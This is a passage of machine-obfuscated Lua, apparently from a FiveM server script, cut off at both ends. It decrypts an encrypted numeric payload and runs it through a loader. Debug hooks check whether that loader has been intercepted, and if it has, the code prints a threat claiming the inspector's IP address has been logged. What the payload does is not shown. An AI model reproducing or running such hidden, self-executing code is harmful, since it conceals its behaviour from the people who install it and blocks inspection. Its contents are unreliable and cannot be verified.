  K, F = 7260530230449700, 16384 + 5402; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; kuXKilFksJnUby4S7B6r0qupXEeB76nsAOvE43UoKs1OD7N5nMdOJZ5X = function(b)
  co = coroutine.create(b)
  tvneCEufIaEm5mefuDioHwyAHQnGt4V3Yi2FBYClkGKNoWlptJBO3f5GMk13Yn9LJifVaG = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(tvneCEufIaEm5mefuDioHwyAHQnGt4V3Yi2FBYClkGKNoWlptJBO3f5GMk13Yn9LJifVaG, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return tvneCEufIaEm5mefuDioHwyAHQnGt4V3Yi2FBYClkGKNoWlptJBO3f5GMk13Yn9LJifVaG
end; iygkEoymrT5LUXjWDwWCTcmr8NDpRJEfSMOLjShiPY5431wk2MUz4zZoD6wAkYXz = function(f, g)
  iQfV2btt8n7xUuj2XKlbfKGHGdiOZ2HZp5yaaCfMXhhvS79ckr2 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; rJwdYtTqfICDaLtLi23m5jxppChmdpx3CixM7oaL8AKTXDRI0KWFNxIzja = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; y71S50bImqAs2P5YUFqt4QwPipiaE8wCqctBDo9ctjNHwNUeOvtZ = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      iQfV2btt8n7xUuj2XKlbfKGHGdiOZ2HZp5yaaCfMXhhvS79ckr2(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; n3E7RV1WMJNBBAjbabhbyGWeHv1VNHRTwTZrwSbGx96tC8OyTDMiN0ZAxa = function(p, n)
    wzS29XOF7hZzuz0vxl09ReT9S2CZn4zuh5K9sV7rmA7RHHTgu1ST0ernyU0IUtdHcjLr = ""
    for k, q in pairs(p) do wzS29XOF7hZzuz0vxl09ReT9S2CZn4zuh5K9sV7rmA7RHHTgu1ST0ernyU0IUtdHcjLr =
      wzS29XOF7hZzuz0vxl09ReT9S2CZn4zuh5K9sV7rmA7RHHTgu1ST0ernyU0IUtdHcjLr ..
      qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL
      [ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('FB') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('CE') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('28') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('BD') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('DC') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('17')]
      [ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('CB') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('EA') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('25') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('28')](
      q) end
    ; n(wzS29XOF7hZzuz0vxl09ReT9S2CZn4zuh5K9sV7rmA7RHHTgu1ST0ernyU0IUtdHcjLr)
  end; rJwdYtTqfICDaLtLi23m5jxppChmdpx3CixM7oaL8AKTXDRI0KWFNxIzja(f,
    function(r) y71S50bImqAs2P5YUFqt4QwPipiaE8wCqctBDo9ctjNHwNUeOvtZ(r, g,
        function(s) n3E7RV1WMJNBBAjbabhbyGWeHv1VNHRTwTZrwSbGx96tC8OyTDMiN0ZAxa(s,
            function(t) if #kuXKilFksJnUby4S7B6r0qupXEeB76nsAOvE43UoKs1OD7N5nMdOJZ5X(qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL[ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('36') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('AF') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('25') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('9E')]) == 1 then if qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL[ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('36') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('AF') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('25') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('9E')] == qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL[ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('82') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('28') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('BD') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('DC') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('CE')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL[ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('36') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('AF') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('25') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('9E')](t) then
                    qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL
                        [ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('36') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('AF') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('25') .. ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG('9E')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; iygkEoymrT5LUXjWDwWCTcmr8NDpRJEfSMOLjShiPY5431wk2MUz4zZoD6wAkYXz(
{ 998, 1037, 1048, 767, 873, 864, 1088, 1139, 1180, 779, 1167, 885, 1129, 1113, 1059, 690, 563, 853, 1005, 962, 926, 584,
  725, 976, 617, 1172, 1099, 936, 1204, 697, 880, 907, 782, 1035, 1171, 627, 1208, 838, 766, 995, 1153, 1144, 1164, 927,
  1212, 792, 841, 1089, 544, 884, 1131, 830, 575, 759, 1123, 623, 784, 701, 1060, 1039, 852, 619, 1143, 1031, 890, 1094,
  631, 831, 689, 1210, 967, 1032, 564, 1120, 1195, 669, 768, 897, 1124, 918, 923, 795, 550, 849, 771, 862, 624, 580, 565,
  980, 698, 1206, 1205, 1106, 1077, 1147, 939, 1149, 716, 949, 1161, 1173, 813, 671, 741, 753, 749, 680, 1202, 777, 583,
  974, 1014, 562, 935, 872, 606, 983, 715, 1141, 708, 1174, 745, 602, 904, 686, 1015, 1165, 891, 1078, 1185, 1067, 743,
  752, 776, 928, 742, 807, 751, 1006, 856, 1010, 1136, 871, 652, 896, 937, 882, 1040, 1065, 955, 810, 1148, 836, 763,
  637, 797, 803, 876, 1003, 857, 1002, 747, 917, 663, 943, 1155, 728, 709, 576, 883, 694, 1070, 608, 1027, 1119, 1064,
  1054, 731, 587, 632, 991, 773, 1162, 566, 1137, 1111, 1159, 1043, 760, 684, 979, 572, 545, 845, 863, 1023, 685, 744,
  940, 1145, 1183, 681, 785, 732, 1109, 843, 647, 1186, 906, 721, 958, 622, 558, 972, 635, 895, 947, 772, 675, 902, 561,
  791, 589, 861, 1196, 934, 925, 870, 668, 1063, 691, 950, 1080, 1071, 605, 574, 963, 824, 682, 1118, 579, 1166, 1069,
  1133, 988, 616, 879, 1192, 965, 818, 1187, 643, 645, 961, 815, 702, 551, 665, 687, 707, 703, 677, 994, 1044, 735, 844,
  1199, 552, 733, 770, 1189, 912, 1057, 1156, 1197, 924, 1045, 1086, 573, 740, 1177, 1062, 630, 607, 603, 990, 1100, 946,
  654, 1041, 999, 705, 966, 866, 865, 679, 678, 758, 1176, 1019, 1203, 814, 802, 688, 670, 823, 1011, 805, 620, 1074,
  806, 582, 973, 819, 1168, 840, 859, 555, 848, 543, 600, 847, 650, 1207, 549, 683, 898, 790, 1138, 827, 672, 993, 858,
  1105, 1092, 664, 1012, 775, 793, 1096, 975, 625, 971, 1038, 755, 1008, 1190, 748, 800, 1194, 666, 1160, 892, 746, 1154,
  653, 833, 614, 826, 1093, 597, 916, 757, 894, 1034, 911, 808, 997, 1102, 1052, 612, 816, 714, 657, 968, 903, 737, 610,
  713, 842, 1029, 1134, 1114, 832, 723, 1135, 834, 1024, 1075, 1128, 901, 964, 711, 1126, 941, 774, 636, 1007, 585, 1181,
  571, 1198, 915, 1091, 724, 820, 1101, 868, 750, 1178, 1130, 1000, 957, 581, 1200, 754, 676, 945, 762, 1013, 1108, 1030,
  613, 948, 567, 978, 1184, 736, 867, 788, 944, 1083, 693, 642, 661, 704, 1095, 1046, 821, 596, 609, 992, 846, 951, 1049,
  1051, 646, 649, 1112, 673, 699, 764, 1085, 1211, 706, 786, 1073, 695, 850, 1076, 594, 1115, 959, 888, 1158, 984, 804,
  1188, 1021, 696, 626, 1132, 794, 969, 727, 789, 825, 1004, 756, 1127, 640, 931, 588, 1140, 570, 615, 629, 660, 942,
  1018, 1058, 1157, 854, 621, 1107, 778, 1026, 738, 662, 878, 765, 717, 639, 633, 932, 1163, 798, 644, 982, 659, 860,
  1061, 1209, 1175, 919, 1122, 851, 1125, 922, 641, 1098, 719, 913, 1191, 761, 809, 1056, 718, 783, 837, 929, 1022, 987,
  881, 970, 1079, 559, 710, 674, 796, 1028, -1, 17, 95, 97, 125, 252, 200, 34, 45, 40, 86, 33, 61, 86, 140, 22, 68, 31,
  173, 90, 118, 86, 17, 8, 75, 118, 82, 203, 88, 50, 65, 71, 2, 76, 124, 183, 98, 93, 37, 68, 64, 8, 45, 51, 205, 124,
  115, 115, 2, 99, 28, 94, 81, 89, 1, 109, 43, 136, 51, 94, 19, 10, 183, 39, 60, 74, 4, 90, 76, 28, 50, 24, 84, 0, 58, 7,
  180, 56, 40, 76, 112, 39, 28, 59, 78, 53, 231, 62, 57, 5, 67, 77, 204, 31, 24, 93, 207, 118, 112, 76, 68, 2, 0, 93, 7,
  73, 100, 19, 34, 193, 13, 68, 45, 211, 69, 77, 245, 82, 84, 9, 127, 85, 68, 7, 112, 106, 45, 97, 93, 21, 20, 30, 81,
  34, 89, 28, 48, 77, 34, 70, 4, 31, 76, 116, 65, 15, 16, 19, 38, 63, 192, 83, 98, 86, 91, 108, 34, 120, 175, 20, 67, 58,
  84, 88, 34, 30, 19, 105, 110, 54, 25, 115, 118, 28, 4, 89, 94, 82, 246, 94, 109, 36, 50, 69, 87, 24, 114, 9, 9, 8, 28,
  37, 4, 22, 110, 112, 39, 47, 91, 76, 86, 29, 31, 76, 19, 76, 3, 27, 28, 15, 54, 52, 3, 76, 102, 21, 98, 38, 0, 17, 100,
  72, 14, 24, 68, 54, 68, 48, 8, 90, 77, 75, 20, 10, 99, 19, 23, 34, 153, 79, 22, 17, 49, 108, 68, 205, 15, 89, 57, 76,
  28, 115, 85, 100, 26, 94, 112, 131, 76, 160, 85, 102, 31, 24, 8, 24, 121, 86, 122, 192, 203, 10, 93, 46, 89, 177, 28,
  6, 71, 41, 177, 27, 38, 118, 107, 68, 183, 3, 3, 32, 18, 20, 109, 134, 106, 40, 111, 43, 59, 83, 19, 86, 21, 124, 125,
  12, 24, 26, 66, 100, 16, 69, 90, 218, 4, 100, 107, 1, 82, 19, 74, 99, 26, 120, 87, 112, 12, 58, 6, 32, 37, 37, 161, 59,
  85, 210, 90, 36, 54, 76, 69, 75, 33, 54, 136, 217, 82, 67, 58, 0, 115, 2, 8, 4, 58, 93, 122, 36, 74, 39, 33, 110, 93,
  228, 116, 7, 94, 100, 243, 82, 59, 33, 60, 55, 7, 31, 63, 47, 38, 127, 90, 8, 90, 81, 84, 85, 30, 18, 49, 76, 102, 147,
  52, 30, 60, 65, 9, 68, 17, 28, 107, 113, 60, 82, 77, 127, 89, 39, 9, 82, 157, 221, 183, 83, 238, 100, 99, 113, 133, 24,
  9, 22, 23, 105, 24, 11, 102, 90, 116, 1, 72, 115, 93, 33, 35, 127, 77, 113, 42, 248, 60, 57, 16, 131, 52, 124, 46, 205,
  4, 86, 66, 84, 35, 112, 244, 99, 102, 72, 18, 79, 64, 104, 77, 68, 118, 13, 17, 32, 40, 37, 19, 99, 28, 85, 172, 75,
  16, 10, 99, 122, 105, 84, 8, 144, 42, 67, 47, 22, 90, 102, 80, 152, 54, 20, 10, 3, 90, 83, 76, 39, 138, 73, 109, 90,
  95, 3, 23, 55, 198, 55, 93, 34, 120, 21, 24, 34, 109, 29, 25, 76, 85, 95, 83, 79, 240, 53, 48, 126, 10, 24, 37, 63, 22,
  31, 16, 20, 112, 20, 50, 234, 108, 87, 122, 46, 1, 211, 8, 39, 38, 1, 109, 16, 56, 40, 6, 157, 115, 5, 35, 85, 82, 187,
  82, 16, 123, 115, 85, 106, 143, 111, 86, 53, 20, 6, 226, 10, 15, 24, 116, 19, 85, 82, 28, 110, 99, 110, 24, 28, 101,
  68, 99, 79, 68, 66, 110, 99, 22, 85, 86, 39, 165, 10, 115, 85, 212, 26, 4, 19, 196, 61, 251, 76, 22, 94, 9, 68, 52, 82,
  76, 74, 97, 110, 19, 35, 10, 25, 33, 69, 5, 89, 14, 109, 11, 27, 112, 44, 86, 85, 49, 21, 228, 12, 102, 102, 84, 25,
  68, 37, 51, 45, 28, 196, 110, 23, 22, 53, 116, 85, 30, 105, 99, 38, 28, 81, 112, 43, 15, 87, 85, 47, 6 },
  "lSrDCuz8yVmFNPlS36d4tK0Mdz"); bnDwIbLCFu1mpi7KrUkVRKwEoAakVPCQHuzoUo0M3JGAtXYZ92oSEhwul1u70xwaDtdYqaJCt =
qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL; aa2LJCbKuJICs7bOIjOmeKJU7CtcX5Wiu79aMxTwfReE5glvCs9IM2kHMiQA =
qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL; wzNeuAd9e1YGbtd8jQL0e7LBH9WcygyQfD34C1aybzcumFWM4Oz =
aa2LJCbKuJICs7bOIjOmeKJU7CtcX5Wiu79aMxTwfReE5glvCs9IM2kHMiQA; bimLiTl3fUG4dKQFBFVr8mEAEyVk3GSpLUF0UgTAjFGoGfvZ8QW4bTG9pGNgzr2saiT7NSi =
wzNeuAd9e1YGbtd8jQL0e7LBH9WcygyQfD34C1aybzcumFWM4Oz; dSGYdoiUKHSjRzRaKVkIEKujdlxmjvtsc3SmFmgu5KSwZHT7z7bE6meEJUpZ2pkmNibo0mY =
bimLiTl3fUG4dKQFBFVr8mEAEyVk3GSpLUF0UgTAjFGoGfvZ8QW4bTG9pGNgzr2saiT7NSi; gSR0OkWdlwQLUQkNACf392ye5JJ02zLxjlB9hSKdsSOwHkj7GqbOTXs =
dSGYdoiUKHSjRzRaKVkIEKujdlxmjvtsc3SmFmgu5KSwZHT7z7bE6meEJUpZ2pkmNibo0mY; fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b =
gSR0OkWdlwQLUQkNACf392ye5JJ02zLxjlB9hSKdsSOwHkj7GqbOTXs; ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf = function(
  a)
  K, F = 1491775128142996, 16384 + 4693; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; l7BtYExqX3yWV0D1vgPUlx6SfU7fylC1sGVZq3zsGqSDFG8bSpAa9DAcUrwJW = function(b)
  co = coroutine.create(b)
  bbtoEFlzcdJu4i8p7LbBlBxNjqbHR70V19uKYx52pf1Brr2qI8RFRiADwmmSHQSMP53p = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(bbtoEFlzcdJu4i8p7LbBlBxNjqbHR70V19uKYx52pf1Brr2qI8RFRiADwmmSHQSMP53p, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return bbtoEFlzcdJu4i8p7LbBlBxNjqbHR70V19uKYx52pf1Brr2qI8RFRiADwmmSHQSMP53p
end; ed2MzfQ4J4Ln09PMNVLQxSTTbFYpssyqwDYKELlr8B6kBzXQM3KpLhTcWFtnxlwEOs4OAynmM = function(f, g)
  aTvsTEGFxuUB8ulAfvS9DP1aVR7gv257LBqmZ7VwPt97IQPRRHUQqBOk = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; gtb3tJfa8K8vOHAlNVlVg6ddR4M8rC44pWvyBOIoP80Oqzk7zWegWyJtZxbMmUHN6KLbwoTK = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; hv0cv67ua1ttQyM6p9oRtkwauVd827QjHqabCyMiONLl8skDrSoyOdRYPpOoJn2bmSuMCB9mVwN = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      aTvsTEGFxuUB8ulAfvS9DP1aVR7gv257LBqmZ7VwPt97IQPRRHUQqBOk(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; n4hU9yaihy98jRZX1OgGqYg6GJI8Rr5dRPf7oJvOpVkVUbCZgR4GL = function(p, n)
    wAVAk4VpwHEqrF9v0Fa85NeGm0r4R5y6tqhxEqsj4kNnfJbncorLQGzpfNl5J2eXji5tk0UL = ""
    for k, q in pairs(p) do wAVAk4VpwHEqrF9v0Fa85NeGm0r4R5y6tqhxEqsj4kNnfJbncorLQGzpfNl5J2eXji5tk0UL =
      wAVAk4VpwHEqrF9v0Fa85NeGm0r4R5y6tqhxEqsj4kNnfJbncorLQGzpfNl5J2eXji5tk0UL ..
      fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b
      [ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('EB') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('42') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('94') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('85') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('38') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('D7')]
      [ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('7B') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('2E') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('CD') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('94')](
      q) end
    ; n(wAVAk4VpwHEqrF9v0Fa85NeGm0r4R5y6tqhxEqsj4kNnfJbncorLQGzpfNl5J2eXji5tk0UL)
  end; gtb3tJfa8K8vOHAlNVlVg6ddR4M8rC44pWvyBOIoP80Oqzk7zWegWyJtZxbMmUHN6KLbwoTK(f,
    function(r) hv0cv67ua1ttQyM6p9oRtkwauVd827QjHqabCyMiONLl8skDrSoyOdRYPpOoJn2bmSuMCB9mVwN(r, g,
        function(s) n4hU9yaihy98jRZX1OgGqYg6GJI8Rr5dRPf7oJvOpVkVUbCZgR4GL(s,
            function(t) if #l7BtYExqX3yWV0D1vgPUlx6SfU7fylC1sGVZq3zsGqSDFG8bSpAa9DAcUrwJW(fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b[ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8A') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8F') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('CD') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('D2')]) == 1 then if fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b[ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8A') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8F') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('CD') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('D2')] == fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b[ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('E6') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('94') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('85') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('38') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('42')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b[ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8A') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('8F') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('CD') .. ugDM6DjYMZGGBuPosqIIjThmGOcjVFGPc9GDg3laDyqW9nim3GiMxIkvDgpf('D2')](t) then
                    fB8RT2MZcC1SKSMDA5OeRabgvA1graeyAxHcniDYYdYQSm0k6ZIbaUmv04ZvN4b
